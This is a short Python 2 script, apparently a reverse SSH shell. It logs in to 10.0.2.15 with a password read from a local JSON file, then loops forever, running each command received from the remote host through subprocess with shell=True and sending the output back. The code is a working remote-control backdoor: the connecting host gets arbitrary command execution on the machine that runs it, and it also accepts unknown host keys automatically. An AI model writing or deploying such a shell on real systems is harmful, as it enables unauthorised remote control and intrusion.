#!/usr/bin/python
import os
import paramiko
import subprocess
import json


def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()

    if os.path.exists("~/.ssh/known_hosts"):
        client.load_host_keys('~/.ssh/known_hosts')

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))

        client.close()

    return


# requires a JSON file in the same directory with format:
# { passwords: { "<user>": "<password>" } }

password = ""

if os.path.exists('passwords.json'):
    json_data = open('passwords.json')
    data = json.load(json_data)
    password = data["passwords"]["yiannisk"]
    json_data.close()


ssh_command("10.0.2.15", "yiannisk", password, "ClientConnected")